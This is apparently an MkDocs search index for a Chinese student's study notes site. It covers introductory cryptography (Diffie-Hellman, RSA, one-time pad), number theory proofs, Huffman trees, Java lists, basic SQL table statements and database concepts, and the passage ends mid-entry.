{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"prontosil\u7684\u5b66\u4e60\u5c0f\u7ad9 \u00b6 \u8bb0\u5f55\u4e00\u4e9b\u94fe\u63a5 \u6c47\u7f16\u8bed\u8a00\u5b66\u4e60\u94fe\u63a5 \u7535\u5b50\u4e66\u7f51\u7ad9\u2014\u2014\u82f1\u6587\u7684\u5462","title":"prontosil\u7684\u5b66\u4e60\u5c0f\u7ad9"},{"location":"#prontosil","text":"\u8bb0\u5f55\u4e00\u4e9b\u94fe\u63a5 \u6c47\u7f16\u8bed\u8a00\u5b66\u4e60\u94fe\u63a5 \u7535\u5b50\u4e66\u7f51\u7ad9\u2014\u2014\u82f1\u6587\u7684\u5462","title":"prontosil\u7684\u5b66\u4e60\u5c0f\u7ad9"},{"location":"2019\u5b66\u671f/Crypto/cry0/","text":"\u516c\u5f00\u5bc6\u94a5\u5bc6\u7801\u5b66 \u00b6 \u5982\u4f55\u5c31\u5bc6\u94a5\u8fbe\u6210\u4e00\u81f4\uff1f \u00b6 \u4ee5\u989c\u8272\u6765\u4e3e\u4f8b\u5982\u4e0b\uff1a Alice \u548c Bob \u9996\u5148\u90fd\u516c\u5f00\u5bf9\u67d0\u79cd\u989c\u8272\u8fbe\u6210\u4e00\u81f4\uff0c\u8fd9\u91cc\u5047\u5b9a\u662f\u9ec4\u8272 Alice \u548c Bob \u90fd\u968f\u673a\u9009\u53d6\u81ea\u5df1\u7684\u79c1\u6709\u989c\u8272\uff0c Alice \u9009\u62e9\u7ea2\u8272\uff0c Bob \u9009\u62e9\u84dd\u8272\uff0c\u4e24\u4e2a\u4eba\u90fd\u5c06\u81ea\u5df1\u7684\u79c1\u6709\u989c\u8272\u4e0e\u9ec4\u8272\u6df7\u5408\uff0c\u5f97\u5230\u4e00\u79cd\u65b0\u7684\u6df7\u5408\u8272\u3002\u4ee5\u6b64\u6765\u63a9\u76d6\u81ea\u5df1\u7684\u79c1\u6709\u8272 Alice \u5c06\u81ea\u5df1\u7684\u6df7\u5408\u8272\u53d1\u7ed9 Bob , Bob \u5c06\u81ea\u5df1\u7684\u6df7\u5408\u8272\u53d1\u7ed9 Alice \uff0c\u6b64\u65f6\u6211\u4eec\u5047\u8bbe\u7a83\u542c\u8005\u4e5f\u53ef\u4ee5\u5f97\u5230 Alice \u548c Bob \u7684\u6df7\u5408\u8272\u3002 Alice \u5f97\u5230 Bob \u7684\u6df7\u5408\u8272\uff0c\u5c06\u5176\u4e0e\u81ea\u5df1\u7684\u79c1\u6709\u8272\u7ea2\u8272\u6df7\u5408\uff0c Bob \u5f97\u5230 Alice \u7684\u6df7\u5408\u8272\uff0c\u5c06\u5176\u4e8e\u81ea\u5df1\u7684\u79c1\u6709\u8272\u84dd\u8272\u6df7\u5408\u3002\u6b64\u65f6\u53ef\u4ee5\u77e5\u9053\u4e24\u4e2a\u4eba\u5f97\u5230\u7684\u989c\u8272\u662f\u4e00\u6837\u7684 \u4f46\u662f\u7a83\u542c\u8005\u5374\u65e0\u6cd5\u5f97\u5230\u8fd9\u4e2a\u5171\u4eab\u79d8\u5bc6\u989c\u8272 \u5982\u4f55\u7528\u6570\u5b66\u6765\u8868\u793a \u00b6 \u6a21\u8fd0\u7b97 \u4e5f\u53eb\u65f6\u949f\u8fd0\u7b97 $46 \\,mod \\,12 \\equiv \\, 10 $ \u539f\u6839 \u8003\u8651\u4f7f\u7528\u8d28\u6570\u4f5c\u6a21\u6570\uff0c\u6bd4\u598217\uff0c\u627e\u523017\u7684\u539f\u6839\uff0c\u4e5f\u5c31\u662f3 \u76f8\u53cd\u8fc7\u7a0b\u5374\u5f88\u96be\uff0c 3^{?} \\, mod \\,17\\equiv \\, 12 3^{?} \\, mod \\,17\\equiv \\, 12 \u8fea\u83f2-\u8d6b\u5c14\u66fc\u5bc6\u94a5\u4ea4\u6362\u534f\u8bae \u00b6 \u53c2\u8003 \u00b6 \u53ef\u6c57\u5b66\u9662 wikipeidia","title":"\u516c\u5f00\u5bc6\u94a5\u5bc6\u7801\u5b66"},{"location":"2019\u5b66\u671f/Crypto/cry0/#_1","text":"","title":"\u516c\u5f00\u5bc6\u94a5\u5bc6\u7801\u5b66"},{"location":"2019\u5b66\u671f/Crypto/cry0/#_2","text":"\u4ee5\u989c\u8272\u6765\u4e3e\u4f8b\u5982\u4e0b\uff1a Alice \u548c Bob \u9996\u5148\u90fd\u516c\u5f00\u5bf9\u67d0\u79cd\u989c\u8272\u8fbe\u6210\u4e00\u81f4\uff0c\u8fd9\u91cc\u5047\u5b9a\u662f\u9ec4\u8272 Alice \u548c Bob \u90fd\u968f\u673a\u9009\u53d6\u81ea\u5df1\u7684\u79c1\u6709\u989c\u8272\uff0c Alice \u9009\u62e9\u7ea2\u8272\uff0c Bob \u9009\u62e9\u84dd\u8272\uff0c\u4e24\u4e2a\u4eba\u90fd\u5c06\u81ea\u5df1\u7684\u79c1\u6709\u989c\u8272\u4e0e\u9ec4\u8272\u6df7\u5408\uff0c\u5f97\u5230\u4e00\u79cd\u65b0\u7684\u6df7\u5408\u8272\u3002\u4ee5\u6b64\u6765\u63a9\u76d6\u81ea\u5df1\u7684\u79c1\u6709\u8272 Alice \u5c06\u81ea\u5df1\u7684\u6df7\u5408\u8272\u53d1\u7ed9 Bob , Bob \u5c06\u81ea\u5df1\u7684\u6df7\u5408\u8272\u53d1\u7ed9 Alice \uff0c\u6b64\u65f6\u6211\u4eec\u5047\u8bbe\u7a83\u542c\u8005\u4e5f\u53ef\u4ee5\u5f97\u5230 Alice \u548c Bob \u7684\u6df7\u5408\u8272\u3002 Alice \u5f97\u5230 Bob \u7684\u6df7\u5408\u8272\uff0c\u5c06\u5176\u4e0e\u81ea\u5df1\u7684\u79c1\u6709\u8272\u7ea2\u8272\u6df7\u5408\uff0c Bob \u5f97\u5230 Alice \u7684\u6df7\u5408\u8272\uff0c\u5c06\u5176\u4e8e\u81ea\u5df1\u7684\u79c1\u6709\u8272\u84dd\u8272\u6df7\u5408\u3002\u6b64\u65f6\u53ef\u4ee5\u77e5\u9053\u4e24\u4e2a\u4eba\u5f97\u5230\u7684\u989c\u8272\u662f\u4e00\u6837\u7684 \u4f46\u662f\u7a83\u542c\u8005\u5374\u65e0\u6cd5\u5f97\u5230\u8fd9\u4e2a\u5171\u4eab\u79d8\u5bc6\u989c\u8272","title":"\u5982\u4f55\u5c31\u5bc6\u94a5\u8fbe\u6210\u4e00\u81f4\uff1f"},{"location":"2019\u5b66\u671f/Crypto/cry0/#_3","text":"\u6a21\u8fd0\u7b97 \u4e5f\u53eb\u65f6\u949f\u8fd0\u7b97 $46 \\,mod \\,12 \\equiv \\, 10 $ \u539f\u6839 \u8003\u8651\u4f7f\u7528\u8d28\u6570\u4f5c\u6a21\u6570\uff0c\u6bd4\u598217\uff0c\u627e\u523017\u7684\u539f\u6839\uff0c\u4e5f\u5c31\u662f3 \u76f8\u53cd\u8fc7\u7a0b\u5374\u5f88\u96be\uff0c 3^{?} \\, mod \\,17\\equiv \\, 12 3^{?} \\, mod \\,17\\equiv \\, 12","title":"\u5982\u4f55\u7528\u6570\u5b66\u6765\u8868\u793a"},{"location":"2019\u5b66\u671f/Crypto/cry0/#-","text":"","title":"\u8fea\u83f2-\u8d6b\u5c14\u66fc\u5bc6\u94a5\u4ea4\u6362\u534f\u8bae"},{"location":"2019\u5b66\u671f/Crypto/cry0/#_4","text":"\u53ef\u6c57\u5b66\u9662 wikipeidia","title":"\u53c2\u8003"},{"location":"2019\u5b66\u671f/Crypto/cry1/","text":"\u6574\u9664 \u00b6 a = q \\cdot b a = q \\cdot b \u8bb0\u4f5c b \\mid a b \\mid a b\u53eb\u505aa\u7684\u56e0\u6570\uff0ca\u53eb\u505ab\u7684\u500d\u6570 \u5f53b\u904d\u5386\u6574\u6570a\u7684\u6240\u6709\u56e0\u6570\u65f6\uff0c-b\u4e5f\u904d\u5386a\u7684\u6240\u6709\u56e0\u6570 \u5f53b\u904d\u5386\u6574\u6570a\u7684\u6240\u6709\u56e0\u6570\u65f6\uff0c \\frac{a}{b} \\frac{a}{b} \u4e5f\u904d\u5386a\u7684\u6240\u54df\u56e0\u6570 \u6027\u8d28\uff1a \u4f20\u9012\u6027 c \\mid a c \\mid a , c \\mid b c \\mid b \u5219 c \\mid a \\pm b c \\mid a \\pm b \u53ef\u4ee5\u63a8\u5e7f\u4e3a sa \\pm tb sa \\pm tb \u5f15\u51fa\u7d20\u6570\u7684\u5b9a\u4e49 \u8bc1\u660e\uff1a\u6bcf\u4e2a\u5408\u6570\u90fd\u6709\u7d20\u56e0\u5b50 \u8bben\u662f\u4e00\u4e2a\u6b63\u5408\u6570\uff0cp\u662fn\u7684\u4e00\u4e2a\u5927\u4e8e1\u7684\u6700\u5c0f\u6b63\u56e0\u6570\uff0c\u5219p\u4e00\u5b9a\u662f\u7d20\u6570 \u53cd\u8bc1\uff1a\u82e5p\u4e0d\u662f\u7d20\u6570\uff0c\u5219\u5b58\u5728\u6574\u6570q\uff0c 1<q<p 1<q<p ,\u4e14 q \\mid p q \\mid p \uff0c\u4f46\u662f p \\mid n p \\mid n \u4f20\u9012\u6027\u6709 q \\mid n q \\mid n \u6240\u4ee5p\u4e0d\u662fn\u7684\u6700\u5c0f\u6b63\u56e0\u6570\uff0c\u77db\u76fe \u63a8\u5e7f\uff1a\u56e0\u4e3an\u662f\u5408\u6570\uff0c\u6240\u4ee5\u5b58\u5728\u6574\u6570 n1 n1 \u4f7f\u5f97\uff1a n = n1 \\cdot p, 1 < p \\leq n1 < n n = n1 \\cdot p, 1 < p \\leq n1 < n \u6240\u4ee5 p^2 \\leq n p^2 \\leq n \u6545 p \\leq \\sqrt n p \\leq \\sqrt n \u6b27\u51e0\u91cc\u5f97\u9664\u6cd5 \u00b6 \u8bc1\u660e\uff1a\u8bbea,b\u662f\u4e24\u4e2a\u6574\u6570\uff0c\u5176\u4e2d b > 0 b > 0 \u5b58\u5728\u552f\u4e00\u7684\u6574\u6570q\u548cr\uff0c\u4f7f\u5f97 a = q \\cdot b + r a = q \\cdot b + r \u8003\u8651\u6574\u6570\u5e8f\u5217\uff1a \\cdot \\cdot \\cdot , -2\\cdot b , - b, 0, b, 2\\cdot b \\cdot \\cdot \\cdot , -2\\cdot b , - b, 0, b, 2\\cdot b \u5c06\u5b9e\u6570\u8f74\u5206\u6210\u957f\u5ea6\u4e3ab\u7684\u533a\u95f4\uff0ca\u4e00\u5b9a\u843d\u5728\u67d0\u4e00\u4e2a\u533a\u95f4\u5185\uff0c","title":"Cry1"},{"location":"2019\u5b66\u671f/Crypto/cry1/#_1","text":"a = q \\cdot b a = q \\cdot b \u8bb0\u4f5c b \\mid a b \\mid a b\u53eb\u505aa\u7684\u56e0\u6570\uff0ca\u53eb\u505ab\u7684\u500d\u6570 \u5f53b\u904d\u5386\u6574\u6570a\u7684\u6240\u6709\u56e0\u6570\u65f6\uff0c-b\u4e5f\u904d\u5386a\u7684\u6240\u6709\u56e0\u6570 \u5f53b\u904d\u5386\u6574\u6570a\u7684\u6240\u6709\u56e0\u6570\u65f6\uff0c \\frac{a}{b} \\frac{a}{b} \u4e5f\u904d\u5386a\u7684\u6240\u54df\u56e0\u6570 \u6027\u8d28\uff1a \u4f20\u9012\u6027 c \\mid a c \\mid a , c \\mid b c \\mid b \u5219 c \\mid a \\pm b c \\mid a \\pm b \u53ef\u4ee5\u63a8\u5e7f\u4e3a sa \\pm tb sa \\pm tb \u5f15\u51fa\u7d20\u6570\u7684\u5b9a\u4e49 \u8bc1\u660e\uff1a\u6bcf\u4e2a\u5408\u6570\u90fd\u6709\u7d20\u56e0\u5b50 \u8bben\u662f\u4e00\u4e2a\u6b63\u5408\u6570\uff0cp\u662fn\u7684\u4e00\u4e2a\u5927\u4e8e1\u7684\u6700\u5c0f\u6b63\u56e0\u6570\uff0c\u5219p\u4e00\u5b9a\u662f\u7d20\u6570 \u53cd\u8bc1\uff1a\u82e5p\u4e0d\u662f\u7d20\u6570\uff0c\u5219\u5b58\u5728\u6574\u6570q\uff0c 1<q<p 1<q<p ,\u4e14 q \\mid p q \\mid p \uff0c\u4f46\u662f p \\mid n p \\mid n \u4f20\u9012\u6027\u6709 q \\mid n q \\mid n \u6240\u4ee5p\u4e0d\u662fn\u7684\u6700\u5c0f\u6b63\u56e0\u6570\uff0c\u77db\u76fe \u63a8\u5e7f\uff1a\u56e0\u4e3an\u662f\u5408\u6570\uff0c\u6240\u4ee5\u5b58\u5728\u6574\u6570 n1 n1 \u4f7f\u5f97\uff1a n = n1 \\cdot p, 1 < p \\leq n1 < n n = n1 \\cdot p, 1 < p \\leq n1 < n \u6240\u4ee5 p^2 \\leq n p^2 \\leq n \u6545 p \\leq \\sqrt n p \\leq \\sqrt n","title":"\u6574\u9664"},{"location":"2019\u5b66\u671f/Crypto/cry1/#_2","text":"\u8bc1\u660e\uff1a\u8bbea,b\u662f\u4e24\u4e2a\u6574\u6570\uff0c\u5176\u4e2d b > 0 b > 0 \u5b58\u5728\u552f\u4e00\u7684\u6574\u6570q\u548cr\uff0c\u4f7f\u5f97 a = q \\cdot b + r a = q \\cdot b + r \u8003\u8651\u6574\u6570\u5e8f\u5217\uff1a \\cdot \\cdot \\cdot , -2\\cdot b , - b, 0, b, 2\\cdot b \\cdot \\cdot \\cdot , -2\\cdot b , - b, 0, b, 2\\cdot b \u5c06\u5b9e\u6570\u8f74\u5206\u6210\u957f\u5ea6\u4e3ab\u7684\u533a\u95f4\uff0ca\u4e00\u5b9a\u843d\u5728\u67d0\u4e00\u4e2a\u533a\u95f4\u5185\uff0c","title":"\u6b27\u51e0\u91cc\u5f97\u9664\u6cd5"},{"location":"2019\u5b66\u671f/Crypto/cry2/","text":"RSA\u7b97\u6cd5 \u00b6 RSA\u4e2d\u5982\u4f55\u4ea7\u751f\u79c1\u94a5\u4e0e\u516c\u94a5 (N,e)\u662f\u516c\u94a5 (N, d)\u662f\u79c1\u94a5 (N,e)\u662f\u516c\u94a5 (N, d)\u662f\u79c1\u94a5 e \\cdot d \\equiv 1 (mod \\, r) e \\cdot d \\equiv 1 (mod \\, r)","title":"RSA\u7b97\u6cd5"},{"location":"2019\u5b66\u671f/Crypto/cry2/#rsa","text":"RSA\u4e2d\u5982\u4f55\u4ea7\u751f\u79c1\u94a5\u4e0e\u516c\u94a5 (N,e)\u662f\u516c\u94a5 (N, d)\u662f\u79c1\u94a5 (N,e)\u662f\u516c\u94a5 (N, d)\u662f\u79c1\u94a5 e \\cdot d \\equiv 1 (mod \\, r) e \\cdot d \\equiv 1 (mod \\, r)","title":"RSA\u7b97\u6cd5"},{"location":"2019\u5b66\u671f/Crypto/cry3/","text":"The one time pad \u00b6 \u4e00\u6b21\u6027\u5bc6\u7801\u672c\uff0c\u7b80\u79f0OTP \u5982\u4f55\u786e\u4fdd\u5bc6\u7801\u7684\u5b89\u5168\u6027\uff0c\u9700\u8981\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6\uff1f \u4e0d\u80fd\u4ece\u5bc6\u6587\u4e2d\u5f97\u5230\u660e\u6587\u7684\u4fe1\u606f\uff0c\u4e5f\u5c31\u662f\u9488\u5bf9\u4e00\u4e2a\u5bc6\u6587\uff0c\u65e0\u6cd5\u786e\u5b9a\u660e\u6587\uff0c\u56e0\u4e3a\u6982\u7387\u90fd\u662f\u4e00\u6837\u7684 \u5728\u4e00\u4e2a\u7edd\u5bf9\u5b89\u5168\u7684\u7b97\u6cd5\u4e2d\uff0c\u5bc6\u94a5\u7684\u957f\u5ea6\u5fc5\u987b\u5927\u4e8e\u660e\u6587\u7684\u957f\u5ea6","title":"The one time pad"},{"location":"2019\u5b66\u671f/Crypto/cry3/#the-one-time-pad","text":"\u4e00\u6b21\u6027\u5bc6\u7801\u672c\uff0c\u7b80\u79f0OTP \u5982\u4f55\u786e\u4fdd\u5bc6\u7801\u7684\u5b89\u5168\u6027\uff0c\u9700\u8981\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6\uff1f \u4e0d\u80fd\u4ece\u5bc6\u6587\u4e2d\u5f97\u5230\u660e\u6587\u7684\u4fe1\u606f\uff0c\u4e5f\u5c31\u662f\u9488\u5bf9\u4e00\u4e2a\u5bc6\u6587\uff0c\u65e0\u6cd5\u786e\u5b9a\u660e\u6587\uff0c\u56e0\u4e3a\u6982\u7387\u90fd\u662f\u4e00\u6837\u7684 \u5728\u4e00\u4e2a\u7edd\u5bf9\u5b89\u5168\u7684\u7b97\u6cd5\u4e2d\uff0c\u5bc6\u94a5\u7684\u957f\u5ea6\u5fc5\u987b\u5927\u4e8e\u660e\u6587\u7684\u957f\u5ea6","title":"The one time pad"},{"location":"2019\u5b66\u671f/alogrithm/java-Arraylist\u548cVectore/","text":"java List\u63a5\u53e3 \u00b6 \u5b9e\u73b0List\u63a5\u53e3\u7684\u4e00\u5171\u6709\u4e09\u79cd\uff0c\u5206\u522b\u662f ArrayList \uff0c Vector \u548c LinkedList","title":"java List\u63a5\u53e3"},{"location":"2019\u5b66\u671f/alogrithm/java-Arraylist\u548cVectore/#java-list","text":"\u5b9e\u73b0List\u63a5\u53e3\u7684\u4e00\u5171\u6709\u4e09\u79cd\uff0c\u5206\u522b\u662f ArrayList \uff0c Vector \u548c LinkedList","title":"java List\u63a5\u53e3"},{"location":"2019\u5b66\u671f/alogrithm/readme/","text":"\u7b97\u6cd5\u590d\u4e60\u9898 \u00b6","title":"\u7b97\u6cd5\u590d\u4e60\u9898"},{"location":"2019\u5b66\u671f/alogrithm/readme/#_1","text":"","title":"\u7b97\u6cd5\u590d\u4e60\u9898"},{"location":"2019\u5b66\u671f/alogrithm/\u54c8\u592b\u66fc\u6811/","text":"\u54c8\u592b\u66fc\u6811 \u00b6 \u5982\u4f55\u6784\u9020 \u00b6 \u6784\u9020\u4e00\u68f5\u54c8\u592b\u66fc\u6811\u7684\u8fc7\u7a0b \u4e0d\u65ad\u5730\u627e\u5230\u8282\u70b9\u6570\u7ec4\u4e2d\u6700\u5c0f\u7684\u4e24\u4e2a\u5143\u7d20\uff0c\u76f8\u52a0\u4e4b\u540e\u653e\u5165\u8282\u70b9\u6570\u7ec4\u4e2d\u7ee7\u7eed\u6bd4\u8f83 \u9047\u5230\u7684\u95ee\u9898 \u00b6 \u54c8\u592b\u66fc\u6811\u4e0d\u4e00\u5b9a\u662f\u5b8c\u5168\u4e8c\u53c9\u6811\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5e73\u8861\u4e8c\u53c9\u6811\u3002 \u53c2\u8003 \u00b6 \u54c8\u592b\u66fc\u6811\uff08\u6700\u4f18\u4e8c\u53c9\u6811\uff09\u53ca\u5176Java\u5b9e\u73b0","title":"\u54c8\u592b\u66fc\u6811"},{"location":"2019\u5b66\u671f/alogrithm/\u54c8\u592b\u66fc\u6811/#_1","text":"","title":"\u54c8\u592b\u66fc\u6811"},{"location":"2019\u5b66\u671f/alogrithm/\u54c8\u592b\u66fc\u6811/#_2","text":"\u6784\u9020\u4e00\u68f5\u54c8\u592b\u66fc\u6811\u7684\u8fc7\u7a0b \u4e0d\u65ad\u5730\u627e\u5230\u8282\u70b9\u6570\u7ec4\u4e2d\u6700\u5c0f\u7684\u4e24\u4e2a\u5143\u7d20\uff0c\u76f8\u52a0\u4e4b\u540e\u653e\u5165\u8282\u70b9\u6570\u7ec4\u4e2d\u7ee7\u7eed\u6bd4\u8f83","title":"\u5982\u4f55\u6784\u9020"},{"location":"2019\u5b66\u671f/alogrithm/\u54c8\u592b\u66fc\u6811/#_3","text":"\u54c8\u592b\u66fc\u6811\u4e0d\u4e00\u5b9a\u662f\u5b8c\u5168\u4e8c\u53c9\u6811\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5e73\u8861\u4e8c\u53c9\u6811\u3002","title":"\u9047\u5230\u7684\u95ee\u9898"},{"location":"2019\u5b66\u671f/alogrithm/\u54c8\u592b\u66fc\u6811/#_4","text":"\u54c8\u592b\u66fc\u6811\uff08\u6700\u4f18\u4e8c\u53c9\u6811\uff09\u53ca\u5176Java\u5b9e\u73b0","title":"\u53c2\u8003"},{"location":"2019\u5b66\u671f/database/SQL/","text":"\u5e38\u89c1\u7684SQL\u8bed\u53e5 \u00b6 \u7531\u4e8eSQL\u8bed\u53e5\u5f88\u5c11\u7528\uff0c\u4f46\u662f\u53c8\u7ecf\u5e38\u5fd8\u8bb0\uff0c\u4e8e\u662f\u8bb0\u5f55\u4e0b\u6765\u597d\u4e86 \u521b\u5efa\u6570\u636e\u8868 1 2 3 4 5 6 7 CREATE TABLE IF NOT EXISTS ` user ` ( ` username ` VARCHAR ( 30 ), ` email ` VARCHAR ( 30 ), ` password ` VARCHAR ( 50 ), ` id ` int UNSIGNED AUTO_INCREMENT , PRIMARY KEY ( ` id ` ) ) ENGINE = InnoDB DEFAULT CHARSET = utf8 ; SQL\u4fee\u6539\u8868 alter table + \u8868\u540d + add + \u8981\u6dfb\u52a0\u7684\u5b57\u6bb5 + \u7c7b\u578b 1 alter table user add img varchar ( 30 ); \u8bbe\u7f6e\u4e3b\u952e\u81ea\u589e(\u524d\u63d0\u662f\u8981\u5148\u8bbe\u7f6e\u4e3b\u952e) 1 alter table user modify ID int auto_increment ; \u4fee\u6539\u5b57\u6bb5\u540d\u79f0 1 alter table user change id ID INT","title":"\u5e38\u89c1\u7684SQL\u8bed\u53e5"},{"location":"2019\u5b66\u671f/database/SQL/#sql","text":"\u7531\u4e8eSQL\u8bed\u53e5\u5f88\u5c11\u7528\uff0c\u4f46\u662f\u53c8\u7ecf\u5e38\u5fd8\u8bb0\uff0c\u4e8e\u662f\u8bb0\u5f55\u4e0b\u6765\u597d\u4e86 \u521b\u5efa\u6570\u636e\u8868 1 2 3 4 5 6 7 CREATE TABLE IF NOT EXISTS ` user ` ( ` username ` VARCHAR ( 30 ), ` email ` VARCHAR ( 30 ), ` password ` VARCHAR ( 50 ), ` id ` int UNSIGNED AUTO_INCREMENT , PRIMARY KEY ( ` id ` ) ) ENGINE = InnoDB DEFAULT CHARSET = utf8 ; SQL\u4fee\u6539\u8868 alter table + \u8868\u540d + add + \u8981\u6dfb\u52a0\u7684\u5b57\u6bb5 + \u7c7b\u578b 1 alter table user add img varchar ( 30 ); \u8bbe\u7f6e\u4e3b\u952e\u81ea\u589e(\u524d\u63d0\u662f\u8981\u5148\u8bbe\u7f6e\u4e3b\u952e) 1 alter table user modify ID int auto_increment ; \u4fee\u6539\u5b57\u6bb5\u540d\u79f0 1 alter table user change id ID INT","title":"\u5e38\u89c1\u7684SQL\u8bed\u53e5"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/","text":"\u6570\u636e\u5e93\u7684\u57fa\u672c\u6982\u5ff5 \u00b6 \u6a21\u5f0f \u00b6 \u6a21\u578b \u00b6 \u9009\u62e9 \u00b6 \u6620\u5c04 \u00b6 \u5173\u7cfb \u00b6 \u5173\u7cfb\u4e2d\u7684\u57fa\u672c\u672f\u8bed\uff1a \u5143\u7ec4\uff1a\u4e8c\u7ef4\u8868\u4e2d\u7684\u6bcf\u4e00\u884c\u79f0\u4e3a\u5173\u7cfb\u7684\u5143\u7ec4\uff0c\u4e8c\u7ef4\u8868\u4e2d\u7684\u6bcf\u4e00\u5217\u79f0\u4e3a\u5173\u7cfb\u7684\u5c5e\u6027\uff0c\u5217\u4e2d\u7684\u5143\u7d20\u79f0\u4e3a\u5c5e\u6027\u7684\u503c\uff0c\u503c\u7684\u53d8\u5316\u8303\u56f4\u53eb\u505a\u5c5e\u6027\u7684\u57df\uff0c\u662f\u4e00\u4e2a\u503c\u7684\u96c6\u5408 \u5019\u9009\u952e\uff1a \u4e3b\u952e \u5916\u952e \u5173\u7cfb\u8fd0\u7b97 \u00b6 \u9009\u62e9 \u601d\u8003 \u00b6 \u963f\u91cc\uff0c\u8682\u8681\u91d1\u670d\uff0c\u817e\u8baf\u7528\u7684\u662f\u4ec0\u4e48\u6570\u636e\u5e93","title":"\u6570\u636e\u5e93\u7684\u57fa\u672c\u6982\u5ff5"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_1","text":"","title":"\u6570\u636e\u5e93\u7684\u57fa\u672c\u6982\u5ff5"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_2","text":"","title":"\u6a21\u5f0f"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_3","text":"","title":"\u6a21\u578b"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_4","text":"","title":"\u9009\u62e9"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_5","text":"","title":"\u6620\u5c04"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_6","text":"\u5173\u7cfb\u4e2d\u7684\u57fa\u672c\u672f\u8bed\uff1a \u5143\u7ec4\uff1a\u4e8c\u7ef4\u8868\u4e2d\u7684\u6bcf\u4e00\u884c\u79f0\u4e3a\u5173\u7cfb\u7684\u5143\u7ec4\uff0c\u4e8c\u7ef4\u8868\u4e2d\u7684\u6bcf\u4e00\u5217\u79f0\u4e3a\u5173\u7cfb\u7684\u5c5e\u6027\uff0c\u5217\u4e2d\u7684\u5143\u7d20\u79f0\u4e3a\u5c5e\u6027\u7684\u503c\uff0c\u503c\u7684\u53d8\u5316\u8303\u56f4\u53eb\u505a\u5c5e\u6027\u7684\u57df\uff0c\u662f\u4e00\u4e2a\u503c\u7684\u96c6\u5408 \u5019\u9009\u952e\uff1a \u4e3b\u952e \u5916\u952e","title":"\u5173\u7cfb"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_7","text":"\u9009\u62e9","title":"\u5173\u7cfb\u8fd0\u7b97"},{"location":"2019\u5b66\u671f/database/\u6570\u636e\u5e93\u57fa\u672c\u6982\u5ff5/#_8","text":"\u963f\u91cc\uff0c\u8682\u8681\u91d1\u670d\uff0c\u817e\u8baf\u7528\u7684\u662f\u4ec0\u4e48\u6570\u636e\u5e93","title":"\u601d\u8003"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/","text":"\u817e\u8baf\uff0c\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93 \u00b6 \u8682\u8681\u91d1\u670d\u2014\u2014OceanBase \u00b6 \u662f\u963f\u91cc\u5df4\u5df4\u96c6\u56e2\u81ea\u4e3b\u7814\u53d1\u7684\u5206\u5e03\u5f0f \u5173\u7cfb\u578b\u6570\u636e\u5e93 \uff0c\u878d\u5408\u4f20\u7edf\u5173\u7cfb\u578b\u6570\u636e\u5e93\u5f3a\u5927\u529f\u80fd\u4e0e\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u7279\u70b9\uff0c\u5177\u5907\u6301\u7eed\u53ef\u7528\u3001\u9ad8\u5ea6\u53ef\u6269\u5c55\u3001\u9ad8\u6027\u80fd\u7b49\u4f18\u52bf\u3002\u5e7f\u6cdb\u5e94\u7528\u4e8e\u8682\u8681\u91d1\u670d\u3001\u7f51\u5546\u94f6\u884c\u7b49\u91d1\u878d\u7ea7\u6838\u5fc3\u7cfb\u7edf\u3002 \u57282015\u5e74\u53cc11\u627f\u8f7d\u4e86\u8682\u8681\u6838\u5fc3\u94fe\u8def100%\u7684\u6d41\u91cf\uff0c\u521b\u4e0b\u4e86\u4ea4\u6613\u3001\u652f\u4ed8\u6bcf\u79d2\u652f\u4ed8\u5cf0\u503c\u7684\u65b0\u7eaa\u5f55\uff0c\u5728\u529f\u80fd\u3001\u7a33\u5b9a\u6027\u3001\u53ef\u6269\u5c55\u6027\u3001\u6027\u80fd\u65b9\u9762\u90fd\u7ecf\u5386\u8fc7\u4e25\u683c\u7684\u68c0\u9a8c\u3002 \u53d1\u5c55\u8fc7\u7a0b \u00b6 \u7279\u70b9\uff1a \u00b6 \u5206\u5e03\u5f0f \u53ef\u9760\u6027\u597d \u4e1a\u52a1\u521b\u65b0\u2014\u2014\u6dd8\u5b9d\u6536\u85cf\u5939 \u00b6 \u6bcf\u4e2a\u4eba\u90fd\u7528\u8fc7\u6dd8\u5b9d\u6536\u85cf\u5939\uff0c\u6bcf\u6b21\u4f60\u6253\u5f00\u6536\u85cf\u5939\u7684\u65f6\u5019\uff0c\u6570\u636e\u5e93\u5728\u80cc\u540e\u5176\u5b9e\u505a\u4e86\u5f88\u591a\u4e8b\u60c5\uff1a\u6211\u4eec\u4ee5\u5355\u4e2a\u5546\u54c1\u4e3a\u4f8b\uff0c\u5b83\u9700\u8981\u5230\u4e00\u4e2a\u53eb\u5546\u54c1\u5e93\u7684\u5730\u65b9\uff0c\u9010\u6761\u7eaa\u5f55\u6838\u5bf9\uff0c\u770b\u770b\u5546\u54c1\u6709\u6ca1\u6709\u4e0b\u67b6\uff0c\u6709\u6ca1\u6709\u53c2\u4e0e\u4fc3\u9500\uff0c\u6709\u6ca1\u6709\u53c2\u52a0\u5176\u4ed6\u7684\u8fd4\u70b9\u6d3b\u52a8\u7b49\u7b49\u3002\u5047\u5982\u4f60\u6536\u85cf\u4e86 100 